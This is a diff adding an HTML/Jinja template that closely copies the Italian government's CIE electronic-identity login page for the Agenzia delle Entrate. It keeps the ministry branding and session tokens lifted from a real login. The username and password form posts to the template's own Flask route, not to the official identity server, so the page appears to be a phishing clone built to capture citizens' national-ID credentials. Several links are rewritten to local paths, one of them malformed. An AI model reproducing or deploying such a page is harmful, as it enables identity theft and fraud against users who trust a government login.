@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html class="h-100" lang="it">
+	<head>
+		<title>CIE Login</title>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width,initial-scale=1.0">
+		<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+		<link rel="stylesheet" href="static/cie/css/bootstrap-italia.min.css">
+		<link rel="stylesheet" href="static/cie/css/l12.css?202603172014">
+		<link rel="apple-touch-icon" sizes="57x57" href="static/cie/images/favicon/apple-touch-icon-57x57.png">
+		<link rel="apple-touch-icon" sizes="60x60" href="static/cie/images/favicon/apple-touch-icon-60x60.png">
+		<link rel="apple-touch-icon" sizes="72x72" href="static/cie/images/favicon/apple-touch-icon-72x72.png">
+		<link rel="apple-touch-icon" sizes="76x76" href="static/cie/images/favicon/apple-touch-icon-76x76.png">
+		<link rel="apple-touch-icon" sizes="114x114" href="static/cie/images/favicon/apple-touch-icon-114x114.png">
+		<link rel="apple-touch-icon" sizes="120x120" href="static/cie/images/favicon/apple-touch-icon-120x120.png">
+		<link rel="apple-touch-icon" sizes="144x144" href="static/cie/images/favicon/apple-touch-icon-144x144.png">
+		<link rel="apple-touch-icon" sizes="152x152" href="static/cie/images/favicon/apple-touch-icon-152x152.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="static/cie/images/favicon/apple-touch-icon-180x180.png">
+		<link rel="icon" type="image/png" sizes="32x32" href="static/cie/images/favicon/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="192x192" href="static/cie/images/favicon/android-chrome-192x192.png">
+		<script src="static/cie/js/bootstrap-italia.bundle.min.js"></script>
+		<script src="static/cie/js/l12.js.jsp?202603172014"></script>
+		<script src="static/cie/js/is.js?202603172014"></script>
+	</head>
+	<body class="d-flex flex-column h-100">
+		<!-- header -->
+		<div id="wrapperL12-header" class="it-header-wrapper ipzs-bb py-2">
+			<div class="it-header-slim-wrapper">
+				<div class="container">
+					<div class="row it-header-slim-wrapper-content">
+						<div class="col">
+							<img src="static/cie/images/ministero@2x.png" alt="Ministero dell'Interno"/>
+						</div>
+						<div class="col-1 text-right">
+							<!-- lang -->
+							<div class="it-header-slim-right-zone">
+								<div class="menu-wrapper" id="switchLang">
+									<ul class="navbar-nav">
+										<li class="nav-item dropdown">
+											<a class="nav-link dropdown-toggle" href="#" role="button" id="eccLangNavDropdown" data-toggle="dropdown" aria-expanded="false" aria-haspopup="true">
+												<span class="sr-only">Selezione lingua: lingua selezionata</span>
+												<span> ITA </span>
+												<svg class="icon-expand icon icon-xs">
+													<use href="static/cie-resources/fixhere/sprite.svg#it-expand"></use>
+												</svg>
+											</a>
+											<div class="dropdown-menu" role="region" aria-labelledby="eccLangNavDropdown">
+												<div class="link-list-wrapper">
+													<ul class="link-list">
+														<li>
+															<a id="switch2it" class="dropdown-item list-item current" href="?eccLang=it&opId=ID1af9927d-5116-44e2-8f95-5ff7c00cd3a8&challenge=GAFgpYZvNlnBAft9b06mo8gFHBhjBHwyYy8qAYFD&level=2&SPName=https%3A%2F%2Fspid.agenziaentrate.gov.it&SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&value=e3s1">
+																<span>ITA
+																	<span class="sr-only">selezionata</span>
+																</span>
+															</a>
+														</li>
+														<li>
+															<a id="switch2de" class="dropdown-item list-item" href="?eccLang=de&opId=ID1af9927d-5116-44e2-8f95-5ff7c00cd3a8&challenge=GAFgpYZvNlnBAft9b06mo8gFHBhjBHwyYy8qAYFD&level=2&SPName=https%3A%2F%2Fspid.agenziaentrate.gov.it&SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&value=e3s1">
+																<span>DEU </span>
+															</a>
+														</li>
+													</ul>
+												</div>
+											</div>
+										</li>
+									</ul>
+								</div>
+							</div>
+							<!-- /lang -->
+						</div>
+						<div class="col-4 col-lg-1 text-right">
+							<img src="static/cie/images/CIE.png" alt="Carta d'identita' elettronica"/>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- /header -->
+		<div id="wrapperL12">
+			<div class="container my-4">
+				<div class="row">
+					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+					<div class="col">
+						<div class="row">
+							<div id="title" class="mb-4 col">
+								<p class="c1">
+									<strong>
+										RICHIESTA D'ACCESSO CIE
+										LIVELLO 2
+									</strong>
+								</p>
+								<h1>Agenzia delle Entrate</h1>
+							</div>
+						</div>
+					</div>
+					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+				</div>
+
+				<div class="row">
+					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+					<div class="col mx-0 mx-sm-n4">
+						<div class="card-wrapper card-space">
+							<div class="card card-bg card-bg-small-none card-big py-0 mx-0 mx-md-1">
+								<div class="card-body p-0 p-sm-4">
+									<div class="row">
+										<div id="loginwithappcard" class="col-12 col-lg-6 pr-lg-4 d-none mb-5 p-0">
+											<!--start card-->
+											<div class="card card-teaser rounded border-left border-primary p-3">
+												<div class="card-body">
+													<div class="row align-items-center">
+														<div class="col-2 ml-3">
+															<img class="img-fluid" src="static/cie/images/android1.jpg" alt="CIE Logo" />
+														</div>
+														<div class="col-9">
+															<h3 class="card-title font-weight-semibold c4">Hai l'app CieID?</h3>
+															<p>Accedi pi&ugrave; velocemente</p>
+														</div>
+													</div>
+													<a href="https://ios.idserver.servizicie.interno.gov.itstatic/cie-resources/fixhere/app?opId=ID1af9927d-5116-44e2-8f95-5ff7c00cd3a8&challenge=GAFgpYZvNlnBAft9b06mo8gFHBhjBHwyYy8qAYFD&level=2&SPName=https%3A%2F%2Fspid.agenziaentrate.gov.it&SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&value=e3s1" class="stretched-link"><span class="sr-only">Autorizza con l'App CieID</span></a>
+												</div>
+											</div>
+											<!--end card-->
+										</div>
+
+										<script>
+											$(document).ready(function() {
+												if (is.mobile()) {
+													//mostra loginwithappcard solo per dispositivi mobile
+													$("#loginwithappcard").removeClass("d-none");
+												}
+											});
+										</script>
+
+										<div class="col-12 col-lg-6 pr-lg-4">
+											<h2>Entra con le tue credenziali CIE</h2>
+
+											{% if error %}
+											<div id="statusHandler" class="row mb-4 mx-n2 error">
+												<div class="col-1 mr-2 my-auto">
+													<svg class="icon">
+														<use xlink:href="/idp/images/l12/sprite.svg#it-close-circle"></use>
+													</svg>
+												</div>
+
+												<div class="col pl-2 my-auto">
+													{% if error.title %}
+													<div id="statusHandlerTitle" class="text-uppercase">
+														<strong>{{ error.title }}</strong>
+													</div>
+													{% endif %}
+
+													{% if error.message %}
+													<p id="statusHandlerMsg">{{ error.message }}</p>
+													{% endif %}
+												</div>
+											</div>
+											{% endif %}
+
+											<div class="mt-3">
+												<form method="POST" action="{{ url_for('auth.cie_login') }}" id="loginUP">
+													<div class="form-row">
+														<div class="form-group col mb-5">
+															<div class="input-group">
+																<label for="username" class="sr-only">Numero <abbr title='Carta d'Identit&agrave; Elettronica'>CIE</abbr> o Codice fiscale o Email</label>
+																<input type="text" class="form-control" id="username" name="username" placeholder="Numero CIE o Codice fiscale o Email" value="" autocomplete="username" tabindex="1"/>
+
+																<div class="input-group-append">
+																	<div class="input-group-text" id="usernameIcon">
+																		<a href="#" data-toggle="modal" data-target="#helpCard">
+																			<svg class="icon icon-primary icon-sm"><use xlink:href="static/cie-resources/fixhere/sprite.svg#it-info-circle"></use></svg>
+																		</a>
+																	</div>
+																</div>
+															</div>
+															<div class="ipzs-validator" id="usernameError">&nbsp;</div>
+														</div>
+													</div>
+													<div class="form-row">
+														<div class="form-group col mb-2">
+															<div class="input-group">
+																<label for="password" class="sr-only">Password</label>
+																<input type="password" class="form-control input-password" id="password" name="password" placeholder="Password" value="" autocomplete="current-password" tabindex="2"/>
+																<span class="password-icon" aria-hidden="true">
+																	<svg class="password-icon-visible icon icon-primary icon-sm d-none"><use xlink:href="static/cie-resources/fixhere/sprite.svg#it-password-visible"></use></svg>
+																	<svg class="password-icon-invisible icon icon-primary icon-sm"><use xlink:href="static/cie-resources/fixhere/sprite.svg#it-password-invisible"></use></svg>
+																</span>
+															</div>
+															<div class="ipzs-validator" id="passwordError">&nbsp;</div>
+														</div>
+													</div>
+
+													<div class="mt-1 pb-1">
+														<p class="c2">Hai dimenticato la password? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/login/recupera-password" title="Richiedi una nuova password" class="text-nowrap" target="_blank">Richiedine una nuova.</a></strong></p>
+													</div>
+													<div class="row buttons mt-4 pb-3">
+														<div class="col-12 col-md-5 text-center mb-3 pr-md-3">
+															<a href="{{ url_for('auth.login') }}" type="button" class="btn btn-outline-primary w-100 text-nowrap">Annulla</a>
+														</div>
+														<div class="col-12 col-md-7 text-center">
+															<button type="submit" class="btn btn-primary w-100">Procedi</button>
+														</div>
+													</div>
+													<div>
+														<p class="c2">Non hai ancora attivato le credenziali CIE? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/attivazione-credenziali-puk" title="Attiva ora le credenziali CIE" class="text-nowrap" target="_blank">Attivale ora</a></strong></p>
+													</div>
+												</form>
+
+												<script>
+													$(document).ready(function() {
+														var submittingUP = false;
+														$('#loginUP').submit(function(event) {
+															if (!submittingUP) {
+																if (checkUsernameAndPassword()) {
+																	submittingUP = true;
+																	return true;
+																}
+															}
+															event.preventDefault();
+															return false;
+														});
+													});
+												</script>
+
+												<div class="modal fade" tabindex="-1" role="dialog" id="helpCard" aria-hidden="true">
+													<div class="modal-dialog modal-lg" role="document">
+														<div class="modal-content">
+															<div class="modal-header ipzs-bb">
+																<h3 class="modal-title">Dove trovo questi dati?<br/>
+																	<small class="c3">Potrai utilizzare indifferentemente come username:</small>
+																</h3>
+																<button class="close" type="button" data-dismiss="modal" aria-label="Close">
+																	<svg class="icon icon-primary">
+																		<use xlink:href="static/cie-resources/fixhere/sprite.svg#it-close-circle"></use>
+																	</svg>
+																</button>
+															</div>
+															<div class="modal-body">
+																<div class="container">
+																	<div class="row">
+																		<div class="col-12 col-lg-6">
+																			<p class="pb-2 text-uppercase"><strong>Numero <abbr title="Carta d&#39;Identit&agrave; Elettronica">CIE</abbr></strong></p>
+																			<p class="text-center text-lg-left"><img src="static/cie/images/fac-simile-cie.png" alt="fac-simile carta d'identit&agrave;" class="img-fluid"/></p>
+																			<p class="py-4 py-lg-2 c3">&Egrave; il numero che trovi in alto a destra sulla carta d'identit&agrave; elettronica. Es. CA00000AA</p>
+																		</div>
+																		<div class="col-12 col-lg-6">
+																			<p class="pb-2 text-uppercase"><strong>Codice fiscale</strong></p>
+																			<p class="text-center text-lg-left"><img src="static/cie/images/fac-simile-cie_retro.png" alt="fac-simile retro carta d'identit&agrave;" class="img-fluid"/></p>
+																			<p class="py-4 py-lg-2 c3">&Egrave; il codice di 16 caratteri alfanumerici che trovi sul retro della carta d'identit&agrave; elettronica.</p>
+																		</div>
+																	</div>
+																	<div class="row">
+																		<div class="col">
+																			<p class="pb-2 pt-4 text-uppercase"><strong>Email</strong></p>
+																			<p class="pb-2 c3">
+																				&Egrave; l'indirizzo e-mail che hai associato alla tua identit&agrave; digitale CIE.<br/>Puoi modificarlo all'interno dell'<a href="https://www.cartaidentita.interno.gov.it/pgic/login">Area personale</a>
+																			</p>
+																		</div>
+																	</div>
+																</div>
+															</div>
+															<div class="modal-footer">
+																<button class="btn btn-primary btn-sm px-5" type="button" data-dismiss="modal">Chiudi</button>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+
+										<div class="col-12 col-lg-6 pl-lg-4 verticalHr d-none d-md-block">
+											<div id="qrWrapper" class="d-none">
+												<h2>Entra con App CieID</h2>
+												<p class="c2">Se hai attivato le Credenziali CIE (livello 2) e hai certificato il dispositivo, apri l'App CieID ed inquadra il QR Code.</p>
+
+												<div>
+													<div>
+														<div class="text-center" id="qrWrapperImg">
+															<figure id="qrFigure" class="overlay-wrapper">
+																<img class="img-fluid" src="data:image/png;base64,{{ qr_code }}" alt="QR code"/>
+																<figcaption id="qrOverlay" class="overlay-panel overlay-panel-fullheight overlay-black" style="display:none;"><span class="my-auto mx-auto"></span></figcaption>
+															</figure>
+															<noscript>
+																Codice QR valido per 2 minuti.
+															</noscript>
+														</div>
+													</div>
+													<div id="qrMsgWrapper">
+														<p class="text-center c2">Se non vuoi usare la modalit&agrave; semplificata ed hai gi&agrave; registrato la tua carta su App CieID (livello 3), seleziona "Entra con lettura carta CIE" qui sotto.</p>
+														<p class="text-center"><span class="c2">Validit&agrave; codice:</span><strong><span id="spanSec"></span> </strong></p>
+													</div>
+													<div id="qrGeneratorWrapper" class="text-center py5" style="display: none;">
+														<div class="pb-3">
+															<p class="text-center c2">Il QR Code non è più valido.<br/>
+																<a href="static/cie-resources/fixhere/livello2">Richiedilo di nuovo</a>
+															</p>
+															<br/>
+														</div>
+													</div>
+													<div id="postQRLink">
+														<p class="text-center c2"><a href="static/cie-resources/fixhere/livello1e2postqrcode" title="dopo aver scansionato il QR, clicca qui per proseguire">Clicca qui dopo aver autenticato tramite QR sulla APP</a></p>
+													</div>
+												</div>
+											</div>
+											<script>
+												$(document).ready(function() {
+													if (!is.mobile()) {
+														$("#qrWrapper").removeClass("d-none"); //tablet/desktop
+
+														checkQRScanned();
+
+														var tempoQR = parseInt("99517");
+
+														countdownQR(Date.now() + tempoQR);
+													}
+												});
+											</script>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+				</div>
+
+				<div id="alternative">
+					<div class="row d-none d-sm-flex">
+						<div class="col-2 d-none d-lg-flex"></div>
+						<div class="col">
+							<div class="row py-2">
+								<div class="col"><hr/></div>
+								<div class="col-2 mx-n1 mx-lg-n3"><p class="c2 text-center or">oppure</p></div>
+								<div class="col"><hr/></div>
+							</div>
+						</div>
+						<div class="col-2 d-none d-lg-flex"></div>
+					</div>
+
+					<div class="row">
+						<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+						<div class="col mx-0 mx-sm-n4">
+							<div class="card-wrapper card-space">
+								<div class="card card-bg card-big p-3 py-sm-0 mx-sm-0 mx-md-1">
+									<div class="card-body p-0 p-sm-4">
+										<h2>Entra con lettura carta</h2>
+
+										<div class="row pt-2">
+											<div class="col-12 col-lg-8 pr-lg-4">
+												<p class="c2">
+													Puoi entrare con la lettura della Carta (livello 3) da uno smartphone NFC con l'App CieID registrando la tua carta o da PC con il software CIE ed un lettore di smart card.
+													<br/><br/>
+													<strong><a href="https://www.cartaidentita.interno.gov.it/la-carta/identificazione-digitale/" target="_blank" title="Entra con app CieID">Scopri di più.</a></strong><br/>
+												</p>
+											</div>
+											<div class="col-12 col-lg-4 pl-lg-4 mt-3 mt-md-0 text-center">
+												<a id="switch2L3" href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=ID901247fd-6c03-4bf0-a4e9-5ff7c00c9599&amp;challenge=%2ByhXpyBLmsgwye7lluwBYxh7byfaRGlYpJOpib6q&amp;level=3&amp;SPName=https%3A%2F%2Fspid.agenziaentrate.gov.it&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e1s2&amp;nextUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2FAuthn%2FX509&amp;name=conversation&amp;authnRequestString=ID901247fd-6c03-4bf0-a4e9-5ff7c00c9599&amp;OpText=Inserisci+le+ultime+4+cifre+del+PIN+ricevute+insieme+alla+tua+Carta+di+Identit%C3%A0+Elettronica+per+accedere+a+https%3A%2F%2Fspid.agenziaentrate.gov.it&amp;imgUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png" class="btn btn-primary btn-image btn-card mb-2 text-nowrap w-100">Entra con lettura carta</a>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+					</div>
+				</div>
+			</div><!-- /wrapperL12 .container-->
+		</div><!-- /wrapperL12 -->
+
+		<!-- footer -->
+		<footer class="it-footer mt-auto">
+			<div class="it-footer-small-prints">
+				<div class="container py-3 text-white px-3 px-md-0">
+					<div class="row">
+						<div class="col-12 col-lg-3">
+							<div class="row">
+								<div class="col-4">
+									<p class="mb-3 opacity">progetto di</p>
+								</div>
+								<div class="col">
+									<img src="static/cie/images/ministero_white.png" alt="Ministero dell'Interno"/>
+									<img src="static/cie/images/ipzs.png" alt="Istituto Poligrafico e Zecca dello Stato Italiano" class="mt-2"/>
+								</div>
+							</div>
+						</div>
+						<div class="col-12 col-lg-4 mt-4 mt-md-0 d-none d-sm-flex">
+							<div class="py-2"></div>
+							<div id="cieidapp" class="pl-sm-4">
+								<div class="mb-3"><strong>CieID App</strong></div>
+								<div class="row">
+									<div class="col-3">
+										<img src="static/cie/images/cieid.png" class="img-fluid cieid" alt="Logo App CieID" />
+									</div>
+									<div class="col">
+										<p class="mb-1">
+											L'app che ti consente di accedere ai servizi in rete utilizzando la tua identit&agrave; digitale CieID
+										</p>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="col-12 col-lg-4 my-auto stores d-none d-sm-flex">
+							<div class="row">
+								<div class="col text-right">
+									<a href="https://apps.apple.com/it/app/cieid/id1504644677" title="Scarica l'app dallo Store Apple" target="_blank"><img src="static/cie/images/appstore@2x.png" class="img-fluid" alt="App Store"/></a>
+								</div>
+								<div class="col">
+									<a href="https://play.google.com/store/apps/details?id=it.ipzs.cieid&hl=it" title="Scarica l'app dal Play Store Google" target="_blank"><img src="static/cie/images/googleplay@2x.png" class="img-fluid" alt="Google Play"/></a>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</footer>
+		<!-- /footer -->
+	</body>
+</html>
